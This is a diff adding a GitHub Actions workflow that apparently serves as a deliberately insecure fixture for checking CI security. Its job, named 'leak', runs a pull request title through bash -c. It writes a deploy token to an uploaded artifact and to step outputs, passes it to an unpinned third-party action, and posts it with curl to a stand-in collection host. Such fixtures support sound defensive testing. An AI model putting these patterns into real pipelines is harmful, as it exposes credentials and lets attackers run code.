@@ -1,0 +1,23 @@
+name: Secret propagation
+on: pull_request
+permissions:
+  contents: write
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: vendor/deploy@main
+        with:
+          token: ${{ secrets.DEPLOY_TOKEN }}
+      - env:
+          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          bash -c "${{ github.event.pull_request.title }}"
+          tool --token "$TOKEN"
+          printf 'token=%s' "$TOKEN" > sensitive/result.txt
+          echo "value=$TOKEN" >> "$GITHUB_OUTPUT"
+          curl -d "$TOKEN" https://example.invalid/collect
+      - uses: actions/upload-artifact@1111111111111111111111111111111111111111
+        with:
+          name: sensitive
+          path: sensitive
